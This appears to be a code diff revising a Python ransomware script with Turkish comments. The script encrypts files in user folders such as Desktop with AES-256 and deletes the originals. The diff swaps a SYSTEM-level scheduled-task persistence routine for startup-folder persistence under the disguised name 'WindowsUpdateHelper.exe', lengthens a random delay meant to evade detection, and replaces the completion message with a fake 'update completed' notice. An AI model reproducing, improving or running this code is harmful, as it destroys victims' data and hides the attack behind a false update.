@@ -1,16 +1,10 @@
-import os
-import random
-import secrets
-import time
-
+import os, shutil, random, secrets, time, tkinter as tk, sys
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-import tkinter as tk
 from tkinter import messagebox
 from pathlib import Path
-
 from cryptography.hazmat.primitives.padding import PKCS7
 from cryptography.hazmat.primitives.serialization import load_pem_public_key
 
@@ -22,43 +16,50 @@ folders_path = [
     str(os.path.join(Path.home(), "Desktop"))
 
 ]
-import subprocess
-import sys
-import os
 
 
-def add_to_task_scheduler():
-    try:
+#def add_to_task_scheduler():
+ #   try:
         # EXE veya script yolu
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+  #      exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
 
         # Masum görev adı (örneğin "WindowsUpdateHelper" veya "AdobeFlashUpdate")
-        task_name = "WindowsUpdateHelper"
+   #     task_name = "WindowsUpdateHelper"
 
         # Komut: Her kullanıcı girişinde çalışsın (ONLOGON)
         # /RU SYSTEM → Yüksek haklar, şifre sormaz
         # /F → Zaten varsa üzerine yaz
-        cmd = [
-            "schtasks", "/Create",
-            "/TN", task_name,
-            "/TR", f'"{exe_path}"',          # exe'yi direkt çalıştır
-            "/SC", "ONLOGON",                # Kullanıcı girişinde
-            "/RL", "HIGHEST",                # En yüksek haklar
-            "/RU", "SYSTEM",                 # SYSTEM hesabı
-            "/F"                             # Zorla oluştur/üzerine yaz
-        ]
+    #    cmd = [
+     #       "schtasks", "/Create",
+      #      "/TN", task_name,
+       #     "/TR", f'"{exe_path}"',          # exe'yi direkt çalıştır
+        #    "/SC", "ONLOGON",                # Kullanıcı girişinde
+         #   "/RL", "HIGHEST",                # En yüksek haklar
+          #  "/RU", "SYSTEM",                 # SYSTEM hesabı
+           # "/F"                             # Zorla oluştur/üzerine yaz
+      #  ]
 
         # Eğer .py ise: "/TR", f'"C:\\Python\\pythonw.exe" "{exe_path}"'
 
-        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+       # result = subprocess.run(cmd, capture_output=True, text=True, check=True)
 
-        print(f"[+] Task Scheduler kalıcılığı eklendi: {task_name}")
-        print(result.stdout)
+        #print(f"[+] Task Scheduler kalıcılığı eklendi: {task_name}")
+    #    print(result.stdout)
 
-    except subprocess.CalledProcessError as e:
-        print(f"[-] schtasks hatası: {e.stderr}")
+   # except subprocess.CalledProcessError as e:
+    #    print(f"[-] schtasks hatası: {e.stderr}")
+   # except Exception as e:
+    #    print(f"[-] Task Scheduler ekleme hatası: {e}")
+
+def add_persistence_startup():
+    try:
+        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        shutil.copy(exe_path, os.path.join(startup_folder, 'WindowsUpdateHelper.exe'))
+        print("[+] Startup folder persistence eklendi")
     except Exception as e:
-        print(f"[-] Task Scheduler ekleme hatası: {e}")
+        print(f"[-] Startup hatası: {e}")
+
 
 
 file_key = secrets.token_bytes(32) # dosyaları sifrelemek için kullanılacak sımetrık AES-256
@@ -126,13 +127,11 @@ def encrypt_file():
                     os.remove(filePath)
 
 if __name__ == "__main__":
-    time.sleep(random.randint(300,900))
-
-
+    time.sleep(random.randint(300, 1200))
+    add_persistence_startup()
     encrypt_file()
-    add_to_task_scheduler()
+    #add_to_task_scheduler()
     root = tk.Tk()
     root.withdraw()
-    root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
-    messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted. ")
+    messagebox.showinfo("Sistem Güncellemesi", "Güncelleme tamamlandı.")
     root.mainloop()
